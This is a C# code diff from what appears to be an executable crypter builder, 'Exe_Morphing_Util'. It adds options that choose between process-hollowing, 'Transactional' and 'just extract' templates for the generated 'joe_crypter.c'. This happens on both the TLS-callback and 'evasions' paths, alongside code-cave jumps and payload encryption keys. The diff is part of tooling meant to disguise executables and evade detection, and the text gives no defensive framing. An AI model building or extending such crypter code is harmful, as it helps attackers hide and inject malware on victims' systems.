@@ -669,7 +669,20 @@ namespace Exe_Morphing_Util
             // with long jmp to our found code cave, have it jump back when done to our EP
             if(cbTLS.Checked)
             {
-                File.Copy("barebones\\dont_touch_me_TLS_callbacks.joe", "builder\\joe_crypter.c", true);
+                // see if we want to use process hollowing or just extract
+                if (rbJustExtract.Checked)
+                {
+                    File.Copy("barebones\\dont_touch_me_TLS_callbacks_just_extract.joe", "builder\\joe_crypter.c", true);
+                }
+                else if(rbTransactional.Checked)
+                {
+                    File.Copy("barebones\\dont_touch_me_TLS_callbacks_Transactional.joe", "builder\\joe_crypter.c", true);
+                }
+                else
+                {   // not these 2? process hollowing is default
+                    File.Copy("barebones\\dont_touch_me_TLS_callbacks.joe", "builder\\joe_crypter.c", true); 
+                }
+                
             
                 string replacecrypto = File.ReadAllText("builder\\joe_crypter.c");
                 replacecrypto = replacecrypto.Replace("cryptokey",payloadcryptkey.ToString());
@@ -874,7 +887,18 @@ namespace Exe_Morphing_Util
         }
         private void evasions_no_tls()
         {
-            File.Copy("barebones\\dont_touch_me.joe", "builder\\joe_crypter.c", true);
+            if (rbJustExtract.Checked)
+            {
+                File.Copy("barebones\\dont_touch_me_just_extract.joe", "builder\\joe_crypter.c", true);
+            }
+            else if (rbTransactional.Checked)
+            {
+                File.Copy("barebones\\dont_touch_me_Transactional.joe", "builder\\joe_crypter.c", true);
+            }
+            else
+            {
+                File.Copy("barebones\\dont_touch_me.joe", "builder\\joe_crypter.c", true);
+            }
             FileStream fs = new FileStream("builder\\joe_crypter.c", FileMode.Open);
             StreamWriter sw = new StreamWriter(fs);
 
